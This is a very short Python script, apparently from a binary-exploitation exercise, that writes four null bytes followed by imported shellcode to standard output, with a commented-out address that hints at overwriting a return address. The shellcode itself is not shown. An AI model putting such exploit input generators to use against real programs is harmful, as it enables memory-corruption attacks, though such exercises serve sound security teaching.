#!/usr/bin/env python3

import sys

from shellcode import shellcode

run = b'\x00'*4 #+b'\x00\x00\x00\x00\x00\x40\x1c\xda'
sys.stdout.buffer.write(run+shellcode)
